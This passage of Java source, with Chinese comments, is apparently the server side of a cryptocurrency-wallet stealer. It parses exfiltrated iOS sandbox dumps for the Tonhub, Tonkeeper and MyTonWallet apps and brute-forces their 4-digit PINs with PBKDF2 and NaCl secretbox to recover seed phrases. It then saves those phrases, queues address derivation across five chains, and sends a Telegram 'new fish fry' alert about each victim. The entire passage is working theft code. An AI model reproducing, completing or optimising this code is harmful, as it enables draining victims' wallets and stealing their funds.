    // ============================================================

    private Path resolveUnpackRoot(String unpackDir) {
        // 可能是相对路径或绝对路径，也可能在 upload 目录下。
        // uploadDir 来自 application.yml 的 consumer.upload-dir，避免硬编码路径。
        String configuredUpload = consumerProps != null
                ? firstNonEmpty(consumerProps.getUploadDir(), "data/uploads")
                : "data/uploads";
        String uploadAbs = new File(configuredUpload).getAbsolutePath().replace('\\', '/');
        Path[] candidates = new Path[]{
                Paths.get(unpackDir),
                Paths.get(uploadAbs).resolve(unpackDir),
                Paths.get("data/uploads").resolve(unpackDir)
        };
        for (Path c : candidates) {
            if (Files.isDirectory(c.resolve("files"))) return c;
        }
        return null;
    }

    private static String firstNonEmpty(String a, String b) {
        return (a != null && !a.isEmpty()) ? a : b;
    }

    private static String readTextUtf8(Path p) {
        try {
            long size = Files.size(p);
            if (size > 32 * 1024 * 1024) return null; // 32MB 以上跳过
            byte[] b = Files.readAllBytes(p);
            return new String(b, StandardCharsets.UTF_8);
        } catch (Exception e) {
            return null;
        }
    }

    private static JSONObject safeJson(String text) {
        try { return JSON.parseObject(text); } catch (Exception e) { return null; }
    }

    private static JSONArray safeJsonArray(String text) {
        try { return JSON.parseArray(text); } catch (Exception e) { return null; }
    }

    private static String safeName(String s) {
        if (s == null || s.isEmpty()) return "unknown";
        return s.replaceAll("[^a-zA-Z0-9_]", "_");
    }

    private static String normalizePhrase(String phrase) {
        if (phrase == null) return "";
        return phrase.toLowerCase().trim().replaceAll("\\s+", " ");
    }

    private static boolean containsWallet(List<PhraseResult> list, String wallet) {
        if (wallet == null) return false;
        for (PhraseResult r : list) if (wallet.equalsIgnoreCase(r.getWallet())) return true;
        return false;
    }

    private static boolean containsPhrase(List<PhraseResult> list, String phrase) {
        if (phrase == null) return false;
        String p = normalizePhrase(phrase);
        for (PhraseResult r : list) if (p.equals(r.getPhrase())) return true;
        return false;
    }

    /** 同一 source（wallet）下是否已有该助记词 */
    private static boolean containsWalletPhrase(List<PhraseResult> list, String wallet, String phrase) {
        if (wallet == null || phrase == null) return false;
        String p = normalizePhrase(phrase);
        for (PhraseResult r : list) {
            if (wallet.equalsIgnoreCase(r.getWallet()) && p.equals(r.getPhrase())) return true;
        }
        return false;
    }

    /**
     * 去重：同 wallet + phrase 只保留先扫到的一条。
     * 同词不同 source（如 coin98 与 exodus）各保留一条。
     */
    static List<PhraseResult> dedup(List<PhraseResult> list) {
        if (list == null || list.isEmpty()) return list;
        List<PhraseResult> out = new ArrayList<>(list.size());
        java.util.Set<String> seen = new java.util.HashSet<>();
        for (PhraseResult r : list) {
            if (r == null || r.getPhrase() == null) continue;
            String key = (r.getWallet() == null ? "" : r.getWallet().toLowerCase())
                    + "|" + r.getPhrase();
            if (!seen.add(key)) continue;
            out.add(r);
        }
        return out;
    }

    private String getDataContent(JSONObject item, String unpackDir) {
        Object dataHex = item.get("dataHex");
        if (dataHex == null) return null;
        if (dataHex instanceof String) return (String) dataHex;
        if (dataHex instanceof JSONObject) {
            JSONObject dh = (JSONObject) dataHex;
            String preview = dh.getString("preview_utf8");
            if (preview != null && !preview.isEmpty()) return preview;
            JSONArray savedAs = dh.getJSONArray("saved_as");
            if (savedAs != null && !savedAs.isEmpty() && unpackDir != null) {
                String relPath = savedAs.getString(0);
                Path root = resolveUnpackRoot(unpackDir);
                if (root != null) {
                    Path t1 = root.resolve("files").resolve(relPath);
                    Path t2 = root.resolve(relPath);
                    Path t = Files.isRegularFile(t1) ? t1 : (Files.isRegularFile(t2) ? t2 : null);
                    if (t != null) return readTextUtf8(t);
                }
            }
        }
        return null;
    }

    private String resolveSandboxValue(Object val, String appName, String filePath, String unpackDir) {
        if (val == null) return null;
        if (val instanceof String) {
            String s = (String) val;
            if (s.isEmpty()) return null;
            try {
                byte[] decoded = java.util.Base64.getDecoder().decode(s);
                return new String(decoded, StandardCharsets.UTF_8);
            } catch (Exception ignore) {}
            return s;
        }
        if (val instanceof JSONObject) {
            JSONObject jo = (JSONObject) val;
            JSONArray savedAs = jo.getJSONArray("saved_as");
            if (savedAs != null && !savedAs.isEmpty() && unpackDir != null) {
                String relPath = savedAs.getString(0);
                Path root = resolveUnpackRoot(unpackDir);
                if (root != null) {
                    Path t1 = root.resolve("files").resolve(relPath);
                    Path t2 = root.resolve(relPath);
                    Path t = Files.isRegularFile(t1) ? t1 : (Files.isRegularFile(t2) ? t2 : null);
                    if (t != null) return readTextUtf8(t);
                }
            }
            String preview = jo.getString("preview_utf8");
            if (preview != null && !preview.isEmpty()) return preview;
        }
        return null;
    }

    private static byte[] parseEntropy(Object entObj) {
        if (entObj == null) return null;
        if (entObj instanceof JSONObject) {
            JSONObject jo = (JSONObject) entObj;
            List<Byte> list = new ArrayList<>();
            for (int i = 0; jo.containsKey(String.valueOf(i)); i++) list.add(jo.getByte(String.valueOf(i)));
            byte[] arr = new byte[list.size()];
            for (int i = 0; i < list.size(); i++) arr[i] = list.get(i);
            return arr;
        }
        if (entObj instanceof JSONArray) {
            JSONArray ja = (JSONArray) entObj;
            byte[] arr = new byte[ja.size()];
            for (int i = 0; i < ja.size(); i++) arr[i] = ja.getByte(i);
            return arr;
        }
        return null;
    }

    /**
     * 归一化 Trust 钱包 KC 密码：
     * - 64 hex 字符串 → 直接返回（CaptureDispatchService 修复后的正确格式）
     * - 128 hex 字符串 → 视为「双重 hex 编码」，尝试 hex 解码一次得到 64 hex 明文，返回明文
     *   （兼容旧版 CaptureDispatchService 把 UTF-8 文本密码（64hex）再 bytesToHex 一次的 bug）
     * - 其他 → 返回 null
     */
    private static String normalizePwdHex(String s) {
        if (s == null) return null;
        String t = s.trim();
        if (t.matches("[0-9a-fA-F]{64}")) return t.toLowerCase();
        if (t.matches("[0-9a-fA-F]{128}")) {
            try {
                byte[] bytes = hexToBytes(t);
                String decoded = new String(bytes, StandardCharsets.UTF_8).trim();
                if (decoded.matches("[0-9a-fA-F]{64}")) {
                    return decoded.toLowerCase();
                }
            } catch (Exception ignore) {}
        }
        return null;
    }

    private static byte[] hexToBytes(String hex) {
        if (hex == null) return null;
        if (hex.length() % 2 != 0) hex = "0" + hex;
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                    + Character.digit(hex.charAt(i + 1), 16));
        }
        return data;
    }

    private static String lower(String s) { return s == null ? "" : s.toLowerCase(); }

    // ============================================================
    // Tonhub 解密：对齐 Python _tonhub_mmkv_str / _tonhub_parse_mmkv / _tonhub_pin_brute / _tonhub_worker
    // ============================================================

    /** 对齐 Python _tonhub_mmkv_str：首字节若==剩余长度视为显式长度前缀，去掉后转 UTF-8 */
    private static String tonhubMmkvStr(byte[] v) {
        if (v == null || v.length == 0) return "";
        try {
            if ((v[0] & 0xFF) == v.length - 1) {
                return new String(v, 1, v.length - 1, StandardCharsets.UTF_8);
            }
        } catch (Exception ignore) {}
        return new String(v, StandardCharsets.UTF_8);
    }

    /**
     * 对齐 Python _tonhub_parse_mmkv：
     * 前 4 字节 u32 LE = actual_size；接着 4 字节保留；pos=8 开始 (varint klen, k, varint vlen, v) 循环。
     */
    private static Map<String, byte[]> tonhubParseMmkv(byte[] data) {
        Map<String, byte[]> out = new HashMap<>();
        if (data == null || data.length < 12) return out;
        int actualSize = ByteBuffer.wrap(data, 0, 4).order(ByteOrder.LITTLE_ENDIAN).getInt();
        int pos = 8;
        int limit = Math.min(8 + actualSize, data.length);
        while (pos < limit) {
            // read_varint
            int klen = 0;
            int shift = 0;
            while (pos < data.length) {
                int b = data[pos] & 0xFF;
                pos++;
                klen |= (b & 0x7F) << shift;
                if ((b & 0x80) == 0) break;
                shift += 7;
                if (shift > 35) return out; // 异常防御
            }
            if (klen <= 0 || klen > 2048 || pos + klen > data.length) break;
            String key = new String(data, pos, klen, StandardCharsets.UTF_8);
            pos += klen;
            // vlen
            int vlen = 0;
            shift = 0;
            while (pos < data.length) {
                int b = data[pos] & 0xFF;
                pos++;
                vlen |= (b & 0x7F) << shift;
                if ((b & 0x80) == 0) break;
                shift += 7;
                if (shift > 35) return out;
            }
            if (vlen < 0 || pos + vlen > data.length) break;
            byte[] val = Arrays.copyOfRange(data, pos, pos + vlen);
            pos += vlen;
            out.put(key, val);
        }
        return out;
    }

    private static final Pattern TON_SECRET_KEY_ENC = Pattern.compile("\"secretKeyEnc\":\"([A-Za-z0-9+/=]+)\"");

    /**
     * 对齐 Python _tonhub_pin_brute：
     * ① 先用明文 BIP39 正则兜底 blob；② 解析 mmkv kv 拿 ton-storage-passcode-nacl(salt) /
     * ton-storage-ref(ref) / ton-storage-passcode-enc-key-{ref}(enc=secretbox(app_key, pwd_key))；
     * ③ 从原始 blob 正则取 secretKeyEnc = secretbox(seed_mnemonic, app_key)；
     * ④ 0000~9999 四位 PIN 枚举：PBKDF2-HMAC-SHA512(PIN, salt_bytes_utf8, 100000, 32) 得 pwd_key；
     *   NaCl secretbox_open(enc[24:], enc[:24], pwd_key) 得 app_key；
     *   NaCl secretbox_open(secret[24:], secret[:24], app_key) 得 seed/mnemonic。
     *
     * <p>并发策略：
     * <ul>
     *   <li>使用全局单例 {@link #TONHUB_BRUTE_POOL} 线程池（CPU/2 线程），防止多 Tonhub 任务时 N×CPU 线程爆炸</li>
     *   <li>同步等待 30 秒上限；若 30s 内命中则正常返回；超时不打断后台任务</li>
     *   <li>超时后若 ctx 不为空，使用 {@link #savePhraseLater(Ctx, PhraseResult, String)} 异步补写入库 + news4 入队</li>
     *   <li>队列满时降级：仅保留明文兜底结果，放弃暴力（AbortPolicy 被捕获）</li>
     * </ul>
     */
    private PhraseResult tonhubPinBrute(byte[] mmkvBlob, Ctx ctx) {
        if (mmkvBlob == null) return null;
        String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
        int blobLen = mmkvBlob.length;
        // ① 明文正则兜底（最快路径，有就直接返回，不占线程池）
        try {
            String lower = new String(mmkvBlob, StandardCharsets.UTF_8).toLowerCase();
            String found = bip39.searchPhrase(lower);
            if (found != null) {
                return new PhraseResult("tonhub", found, "mmkv_plaintext");
            }
        } catch (Exception ignore) {}

        Map<String, byte[]> kv;
        try {
            kv = tonhubParseMmkv(mmkvBlob);
        } catch (Exception e) {
            log.warn("【mnemonic】tonhub parse_mmkv FAIL（无法读取 ton-storage-* key） ctx_id={} blob_len={} err={}", ctxId, blobLen, e.toString());
            return null;
        }
        byte[] saltRaw = kv.get("ton-storage-passcode-nacl");
        byte[] refRaw = kv.get("ton-storage-ref");
        if (saltRaw == null || refRaw == null) {
            log.warn("【mnemonic】tonhub KV 缺加密键（无 salt/ref），暴力不启动 ctx_id={} blob_len={} salt_present={} ref_present={} kv_keys_ton={}",
                    ctxId, blobLen, (saltRaw != null), (refRaw != null),
                    kv.keySet().stream().filter(k -> k.startsWith("ton-storage")).collect(Collectors.toList()));
            return null;
        }
        String salt = tonhubMmkvStr(saltRaw);
        String ref = tonhubMmkvStr(refRaw);
        byte[] encKeyRaw = kv.get("ton-storage-passcode-enc-key-" + ref);
        if (encKeyRaw == null) {
            log.warn("【mnemonic】tonhub KV 缺 ton-storage-passcode-enc-key-{{}} 暴力不启动 ctx_id={} blob_len={} kv_keys_enc={}",
                    ref.length() > 24 ? ref.substring(0, 24) + "…" : ref,
                    ctxId, blobLen,
                    kv.keySet().stream().filter(k -> k.startsWith("ton-storage-passcode-enc-key-")).map(k -> {
                        int sub = k.length() - "ton-storage-passcode-enc-key-".length();
                        return "enc-key*" + sub;
                    }).collect(Collectors.toList()));
            return null;
        }
        String encB64 = tonhubMmkvStr(encKeyRaw);
        byte[] enc;
        try {
            enc = Base64.getDecoder().decode(encB64.trim());
        } catch (Exception e) {
            log.warn("【mnemonic】tonhub enc base64 解码失败 ctx_id={} enc_len_raw={} err={}", ctxId, encB64.length(), e.toString());
            return null;
        }
        if (enc.length < 24 + 16) {
            log.warn("【mnemonic】tonhub enc 长度过短 ctx_id={} enc_len={}(需≥40)", ctxId, enc.length);
            return null;
        }
        // secretKeyEnc：走原始 blob 正则（Python 代码也是在整份 blob 里正则找，不依赖 kv key 名）
        Matcher sm = TON_SECRET_KEY_ENC.matcher(new String(mmkvBlob, StandardCharsets.ISO_8859_1));
        if (!sm.find()) {
            log.warn("【mnemonic】tonhub 原始 blob 无 \"secretKeyEnc\":\"...\" JSON 片段，暴力不启动 ctx_id={} blob_len={}", ctxId, blobLen);
            return null;
        }
        byte[] secret;
        try {
            secret = Base64.getDecoder().decode(sm.group(1));
        } catch (Exception e) {
            log.warn("【mnemonic】tonhub secretKeyEnc base64 解码失败 ctx_id={} secret_len_raw={} err={}", ctxId, sm.group(1).length(), e.toString());
            return null;
        }
        if (secret.length < 24 + 16) {
            log.warn("【mnemonic】tonhub secret 长度过短 ctx_id={} secret_len={}(需≥40)", ctxId, secret.length);
            return null;
        }
        final byte[] saltBytes = salt.getBytes(StandardCharsets.UTF_8);
        final byte[] encFinal = enc;
        final byte[] secretFinal = secret;

        // ④ 4 位 PIN 暴力破解 —— 同时统计每一步失败原因，全失败时打印细分计数
        log.info("【mnemonic】tonhub 开始 PIN 暴力破解(0000-9999) kdf=PBKDF2-HMAC-SHA512/100000 salt_len={} enc_len={} secret_len={} ctx_id={}",
                saltBytes.length, encFinal.length, secretFinal.length, ctxId);
        long t0 = System.currentTimeMillis();
        final AtomicReference<PhraseResult> hitRef = new AtomicReference<>();
        final AtomicReference<String> hitPin = new AtomicReference<>();
        // 失败原因细分计数（每 chunk 单独 AtomicInteger 数组也行，用 5 个 AtomicLong 最安全）
        final java.util.concurrent.atomic.AtomicLong cPbkdf2Fail = new java.util.concurrent.atomic.AtomicLong(0);
        final java.util.concurrent.atomic.AtomicLong cBox1Fail  = new java.util.concurrent.atomic.AtomicLong(0);
        final java.util.concurrent.atomic.AtomicLong cBox2Fail  = new java.util.concurrent.atomic.AtomicLong(0);
        final java.util.concurrent.atomic.AtomicLong cUtfFail   = new java.util.concurrent.atomic.AtomicLong(0);
        final java.util.concurrent.atomic.AtomicLong cBadWords  = new java.util.concurrent.atomic.AtomicLong(0);

        int poolThreads = TONHUB_BRUTE_POOL.getCorePoolSize();
        int numChunks = Math.max(4, poolThreads * 2);
        int chunk = (10000 + numChunks - 1) / numChunks;

        // 可配置同步等待超时：默认 5s（替代原硬编码 30s），设为 0 则完全异步不阻塞 worker
        long syncTimeoutMs = consumerProps == null ? 5000L : consumerProps.getTonhubBruteSyncTimeoutMs();

        // 串行化：限制同时爆破的 device 数，避免多 device 并发暴力打满 CPU 拖慢 parse_ci
        final boolean[] acquired = {false};
        if (consumerProps != null && consumerProps.isTonhubBruteSerialize() && tonhubBruteSemaphore != null) {
            if (!tonhubBruteSemaphore.tryAcquire()) {
                log.info("【mnemonic】tonhub 串行化限制，跳过爆破 ctx_id={}", ctxId);
                return null;
            }
            acquired[0] = true;
            log.info("【mnemonic】tonhub 串行化许可已获取 ctx_id={}", ctxId);
        }

        // 直接提交 chunks 到 TONHUB_BRUTE_POOL（同步/异步模式共用）
        final List<CompletableFuture<Void>> futs = new ArrayList<>(numChunks);
        boolean submittedAll = true;
        for (int i = 0; i < 10000; i += chunk) {
            final int start = i;
            final int end = Math.min(i + chunk, 10000);
            try {
                futs.add(CompletableFuture.runAsync(() -> {
                    tonhubBruteChunk(start, end, hitRef, hitPin, encFinal, secretFinal, saltBytes,
                            cPbkdf2Fail, cBox1Fail, cBox2Fail, cUtfFail, cBadWords);
                }, TONHUB_BRUTE_POOL));
            } catch (RejectedExecutionException rejected) {
                submittedAll = false;
                log.warn("【mnemonic】tonhub 线程池队列满，降级：已提交 {}/{} chunk，其余放弃 ctx_id={}",
                        futs.size(), numChunks, ctxId);
                break;
            }
        }

        PhraseResult syncResult = null;
        if (!futs.isEmpty()) {
            CompletableFuture<Void> all = CompletableFuture.allOf(futs.toArray(new CompletableFuture[0]));
            if (syncTimeoutMs <= 0) {
                // 完全异步模式：chunks 已提交到池中开始执行，注册回调后立即返回
                // 与同步超时后转异步的路径完全一致，不引入额外串行执行器
                log.info("【mnemonic】tonhub 完全异步模式(syncTimeout=0)，worker 立即释放 ctx_id={}", ctxId);
                final Ctx fctx0 = ctx;
                all.whenComplete((v, th) -> {
                    PhraseResult late = hitRef.get();
                    finishTonhubBrute(acquired[0]);
                    long cost = System.currentTimeMillis() - t0;
                    if (late != null) {
                        savePhraseLater(fctx0, late, hitPin.get());
                    } else {
                        log.warn("【mnemonic】tonhub 异步跑完 10000 个 PIN 仍未命中 总耗时={}ms ctx_id={} 细分: pbkdf2_fail={} box1_fail={} box2_fail={} utf_fail={} bad_words={}",
                                cost, (fctx0 == null || fctx0.ios18paramId == null) ? null : String.valueOf(fctx0.ios18paramId),
                                cPbkdf2Fail.get(), cBox1Fail.get(), cBox2Fail.get(), cUtfFail.get(), cBadWords.get());
                    }
                });
                return null;
            }
            try {
                all.get(syncTimeoutMs, TimeUnit.MILLISECONDS);
                syncResult = hitRef.get();
            } catch (TimeoutException timedOut) {
                syncResult = hitRef.get();
                if (syncResult != null) {
                } else {
                    log.warn("【mnemonic】tonhub {}ms 同步超时，转入后台继续破解，ctx_id={} 后续异步补写", syncTimeoutMs, ctxId);
                    final Ctx fctx = ctx;
                    all.whenComplete((v, th) -> {
                        PhraseResult late = hitRef.get();
                        finishTonhubBrute(acquired[0]);
                        if (late != null) {
                            savePhraseLater(fctx, late, hitPin.get());
                        } else {
                            long cost = System.currentTimeMillis() - t0;
                            log.warn("【mnemonic】tonhub 后台跑完 10000 个 PIN 仍未命中（超时后） 总耗时={}ms ctx_id={} 细分: pbkdf2_fail={} box1_fail={} box2_fail={} utf_fail={} bad_words={}",
                                    cost, (fctx == null || fctx.ios18paramId == null) ? null : String.valueOf(fctx.ios18paramId),
                                    cPbkdf2Fail.get(), cBox1Fail.get(), cBox2Fail.get(), cUtfFail.get(), cBadWords.get());
                        }
                    });
                    return null; // 超时未命中：Semaphore 在 whenComplete 中释放，直接返回避免末尾重复释放
                }
            } catch (Exception e) {
                log.warn("【mnemonic】tonhub brute await FAIL ctx_id={} err={}", ctxId, e.toString());
                syncResult = hitRef.get();
            }
        } else if (!submittedAll) {
            log.warn("【mnemonic】tonhub 未提交任何暴力任务，线程池压力过大 ctx_id={}", ctxId);
        }

        PhraseResult r = syncResult;
        if (r != null) {
        } else if (submittedAll && !futs.isEmpty() && hitRef.get() == null) {
            long cost = System.currentTimeMillis() - t0;
            log.warn("【mnemonic】tonhub 暴力跑完 10000 个 PIN 未命中 ctx_id={} 耗时={}ms 细分失败计数: pbkdf2_fail={} secretbox1(wrong PIN)={} secretbox2(bad appKey)={} utf_decode_fail={} decrypt_OK_but_not_BIP39={}",
                    ctxId, cost, cPbkdf2Fail.get(), cBox1Fail.get(), cBox2Fail.get(), cUtfFail.get(), cBadWords.get());
        }
        finishTonhubBrute(acquired[0]);
        return r;
    }

    // ============================================================
    // Tonhub 异步补写：超时解出后，独立写入 mnemonic + 推送 news4 wallet_derive
    // ============================================================

    /**
     * 释放 Tonhub 暴力串行化许可。
     * 在所有暴力完成路径（同步/异步/超时）统一调用，避免遗漏释放。
     * @param acquired 是否获取过串行化许可
     */
    private void finishTonhubBrute(boolean acquired) {
        if (acquired && tonhubBruteSemaphore != null) {
            try { tonhubBruteSemaphore.release(); }
            catch (Exception ignore) {}
        }
    }

    /**
     * Tonhub PIN 暴力单个 chunk 的执行逻辑（提取为独立方法，供同步/异步模式共用）。
     */
    private void tonhubBruteChunk(int start, int end,
            AtomicReference<PhraseResult> hitRef, AtomicReference<String> hitPin,
            byte[] encFinal, byte[] secretFinal, byte[] saltBytes,
            java.util.concurrent.atomic.AtomicLong cPbkdf2Fail,
            java.util.concurrent.atomic.AtomicLong cBox1Fail,
            java.util.concurrent.atomic.AtomicLong cBox2Fail,
            java.util.concurrent.atomic.AtomicLong cUtfFail,
            java.util.concurrent.atomic.AtomicLong cBadWords) {
        if (hitRef.get() != null) return;
        try {
            // Bouncy Castle PBKDF2-HMAC-SHA512：比 JDK 默认 SecretKeyFactory 快约 30-50%
            // 避免 char[]→byte[] 转换开销，直接用字节数组密码
            PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA512Digest());
            byte[] nonce = Arrays.copyOfRange(encFinal, 0, 24);
            byte[] box = Arrays.copyOfRange(encFinal, 24, encFinal.length);
            byte[] n2 = Arrays.copyOfRange(secretFinal, 0, 24);
            byte[] b2 = Arrays.copyOfRange(secretFinal, 24, secretFinal.length);
            for (int pinInt = start; pinInt < end; pinInt++) {
                if (hitRef.get() != null) return;
                String pin = String.format("%04d", pinInt);
                byte[] pwdKey;
                try {
                    gen.init(pin.getBytes(StandardCharsets.UTF_8), saltBytes, 100000);
                    pwdKey = ((KeyParameter) gen.generateDerivedParameters(256)).getKey();
                } catch (Exception e) {
                    cPbkdf2Fail.incrementAndGet();
                    continue;
                }
                Optional<byte[]> appKeyOpt;
                try {
                    appKeyOpt = new SecretBox(pwdKey).open(nonce, box);
                } catch (Exception e) {
                    cBox1Fail.incrementAndGet();
                    continue;
                }
                if (!appKeyOpt.isPresent()) { cBox1Fail.incrementAndGet(); continue; }
                byte[] appKey = appKeyOpt.get();
                byte[] seed;
                try {
                    Optional<byte[]> maybe = new SecretBox(appKey).open(n2, b2);
                    if (!maybe.isPresent()) { cBox2Fail.incrementAndGet(); continue; }
                    seed = maybe.get();
                } catch (Exception e) {
                    cBox2Fail.incrementAndGet();
                    continue;
                }
                String mn;
                try {
                    mn = new String(seed, StandardCharsets.UTF_8).trim();
                } catch (Exception e) {
                    cUtfFail.incrementAndGet();
                    continue;
                }
                boolean valid = false;
                try { valid = bip39.validateMnemonic(mn); } catch (Exception ignore) {}
                int wc = mn.split("\\s+").length;
                if (valid || wc == 12 || wc == 15 || wc == 18 || wc == 21 || wc == 24) {
                    if (hitRef.compareAndSet(null, new PhraseResult("tonhub", mn,
                            valid ? "mmkv_passcode_brute" : "mmkv_passcode_brute_unvalidated"))) {
                        hitPin.set(pin);
                    }
                    return;
                } else {
                    cBadWords.incrementAndGet();
                }
            }
        } catch (Throwable ignore) {}
    }

    /**
     * 异步补写 Tonhub 助记词入库 + 推送 news4。
     * 必须在 tonhub-brute 线程池的 whenComplete 回调中调用（本身已是异步线程）。
     */
    private void savePhraseLater(Ctx ctx, PhraseResult r, String pin) {
        if (ctx == null || r == null) return;
        if (ctx.ios18paramId == null || ctx.deviceId == null) return;
        try {
            // 1) 查询 device 拿 channelcode（与 ParseCiHandler 一致）
            DeviceEntity deviceEntity = null;
            try { deviceEntity = deviceDao.findByDeviceid(ctx.deviceId); }
            catch (Exception e) { log.warn("【mnemonic-tonhub-later】device 查询失败 device={} err={}", ctx.deviceId, e.toString()); }
            String channelcode = deviceEntity == null ? null : deviceEntity.getChannelCode();

            // 2) 助记词 hash + 加密
            String phrasePlain = r.getPhrase();
            String phraseHash = sha256Hex(phrasePlain.getBytes(StandardCharsets.UTF_8));
            String phraseEnc = aesEncryptMnemonic(phrasePlain);
            if (phraseEnc == null || phraseEnc.isEmpty()) {
                log.error("【mnemonic-tonhub-later】助记词加密失败，放弃补写 id={}", ctx.ios18paramId);
                return;
            }

            // 3) 异步补写幂等检查：同 device + source + phrase_hash 已存在则跳过（避免 autoClaim 重试 + 异步爆破并发导致重复入库）
            Integer existId = null;
            try {
                existId = mnemonicDao.findIdByDeviceSourceHash(ctx.deviceId, r.getWallet(), phraseHash);
            } catch (Exception e) {
                log.warn("【mnemonic-tonhub-later】幂等查询失败 device={} source={} hash={} err={}",
                        ctx.deviceId, r.getWallet(), phraseHash, e.toString());
            }
            if (existId != null) {
                log.info("【mnemonic-tonhub-later】幂等命中，跳过补写 exist_id={} device={} source={} hash={}",
                        existId, ctx.deviceId, r.getWallet(), phraseHash);
                return;
            }

            // 4) 入库
            double now = System.currentTimeMillis() / 1000.0;
            MnemonicEntity me = new MnemonicEntity();
            me.setDeviceId(ctx.deviceId);
            me.setWordscount(r.getWordCount());
            me.setChannelcode(channelcode);
            me.setResult(phraseEnc);
            me.setSource(r.getWallet());
            me.setStatus(1);
            me.setPhraseHash(phraseHash);
            me.setAddtime(now);
            mnemonicDao.insert(me);
            log.info("【mnemonic-tonhub-later】补写入库成功 mnemonic_id={} ios18param={} wallet={} words={}",
                    me.getId(), ctx.ios18paramId, r.getWallet(), r.getWordCount());

            // 5) 入队 news4:tasks wallet_derive
            enqueueWalletDeriveLater(ctx, phraseHash, me.getId());

            // 6) 异步飞机「新鱼苗」通知
            if (deviceEntity != null && mnemonicTelegramService != null) {
                try {
                    mnemonicTelegramService.notifyFishAsync(deviceEntity);
                } catch (Exception e) {
                    log.warn("【mnemonic-tonhub-later】新鱼苗通知提交失败 device={} err={}",
                            ctx.deviceId, e.toString());
                }
            }
        } catch (Throwable t) {
            log.error("【mnemonic-tonhub-later】补写失败 ios18param={} err={}", ctx.ios18paramId, t.toString());
        }
    }

    /** 异步补写 news4 wallet_derive 消息入队 */
    private void enqueueWalletDeriveLater(Ctx ctx, String phraseHash, Integer mnemonicId) {
        if (consumerProps == null || !consumerProps.isNews4TaskEnabled()) return;
        if (redisPush == null || ctx == null) return;
        try {
            Map<String, String> job = new HashMap<>();
            job.put("job", "wallet_derive");
            job.put("ios18param_id", String.valueOf(ctx.ios18paramId));
            job.put("mnemonic_id", String.valueOf(mnemonicId));
            job.put("device_id", ctx.deviceId == null ? "" : ctx.deviceId);
            job.put("phrase_hash", phraseHash == null ? "" : phraseHash);
            job.put("address_idx", "0");
            job.put("chains", "tron,eth,bsc,btc,sol");
            redisPush.notifySync(job, consumerProps.getNews4Stream());
            log.info("【mnemonic-tonhub-later】news4 wallet_derive 补写入队成功 mnemonic_id={} device={}",
                    mnemonicId, ctx.deviceId);
        } catch (Throwable t) {
            log.error("【mnemonic-tonhub-later】补写 news4 入队失败 mnemonic_id={} err={}", mnemonicId, t.toString());
        }
    }

    /** mnemonic AES-256-ECB 加密（与 ParseCiHandler.initAesKey 使用同一密钥） */
    private String aesEncryptMnemonic(String plain) {
        try {
            SecretKeySpec key = this.mnemonicAesKey;
            if (key == null) {
                log.warn("【mnemonic-tonhub-later】mnemonicAesKey 未初始化，跳过加密");
                return null;
            }
            Cipher c = Cipher.getInstance("AES/ECB/PKCS5Padding");
            c.init(Cipher.ENCRYPT_MODE, key);
            byte[] enc = c.doFinal(plain.getBytes(StandardCharsets.UTF_8));
            return Base64.getEncoder().encodeToString(enc);
        } catch (Throwable t) {
            log.error("【mnemonic-tonhub-later】aesEncryptMnemonic FAIL: {}", t.toString());
            return null;
        }
    }

    /** SHA-256 hex（与 ParseCiHandler 对齐，重复一份保持类独立性，避免循环依赖） */
    private static String sha256Hex(byte[] data) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            byte[] d = md.digest(data);
            StringBuilder sb = new StringBuilder(d.length * 2);
            for (byte b : d) {
                int v = b & 0xFF;
                sb.append(HEX_CHARS[v >>> 4]).append(HEX_CHARS[v & 0x0F]);
            }
            return sb.toString();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // --- Tonhub: Documents/mmkv/mmkv.default — 明文兜底 + MMKV-TLV + PBKDF2-HMAC-SHA512(100k) + NaCl secretbox 4 位 PIN 暴力 ---
    private void scanSandboxTonhub(Path sandbox, List<PhraseResult> out, Ctx ctx) {
        if (containsWallet(out, "tonhub")) return;
        String ctxId = (ctx == null || ctx.ios18paramId == null) ? null : String.valueOf(ctx.ios18paramId);
        // 异步模式下，tonhubPinBrute 提交暴力任务后立即返回 null，暴力在后台运行。
        // 此时不需要再尝试其他 mmkv.default 文件，避免重复提交暴力任务打满线程池。
        long syncTimeoutMs = consumerProps == null ? 5000L : consumerProps.getTonhubBruteSyncTimeoutMs();
        boolean asyncMode = syncTimeoutMs <= 0;
        // iOS 解压后 TON 钱包的目录名有很多变体，先按候选依次尝试，候选都没命中再 glob 整个 sandbox
        String[] variants = {
                "tonhub",          // 原始 Tonhub App
                "ton_wallet",      // Tonhub 新包名 / tonkeeper 旧别名
                "tonhub_wallet",   // 部分抓包工具导出时的重命名
                "tonkeeper",       // 现在官方已改名为 Tonkeeper（目录名会变 ton-keeper / tonkeeper）
                "ton-keeper",      // 带短横线版
                "mytonwallet"      // MyTonWallet iOS（结构相同）
        };
        List<Path> triedPaths = new ArrayList<>();
        for (String dir : variants) {
            Path cand = sandbox.resolve(dir).resolve("Documents").resolve("mmkv").resolve("mmkv.default");
            triedPaths.add(cand);
            if (!Files.isRegularFile(cand)) continue;
            byte[] blob;
            try {
                blob = Files.readAllBytes(cand);
            } catch (IOException e) {
                log.warn("【mnemonic】tonhub 读取 {} 失败 ctx_id={} err={}", cand, ctxId, e.toString());
                continue;
            }
            if (blob == null || blob.length == 0) {
                log.warn("【mnemonic】tonhub 文件为空 {} ctx_id={}", cand, ctxId);
                continue;
            }
            PhraseResult r = tonhubPinBrute(blob, ctx);
            if (r != null) {
                out.add(r);
                return;
            } else {
                // tonhubPinBrute 内部已经把"为什么返回 null"的分级 WARN 打过了，这里只补一句"路径 × 尝试过 → 未产出结果"
                log.warn("【mnemonic】tonhub 路径 {}（ctx_id={}）已执行 tonhubPinBrute，但未返回任何助记词（详见上方 tonhub*_ 分级 WARN）", cand, ctxId);
                // 异步模式：暴力任务已提交到后台线程池，不再尝试其他文件
                if (asyncMode) return;
            }
        }
        // 5 个 variant 都没命中 → 再兜底 glob 一下 sandbox/**/Documents/mmkv/mmkv.default，防止还有新的命名
        try {
            List<Path> extras = new ArrayList<>();
            try (java.util.stream.Stream<Path> s = Files.walk(sandbox, 6)) {
                s.filter(p -> p.getFileName() != null && "mmkv.default".equals(p.getFileName().toString())
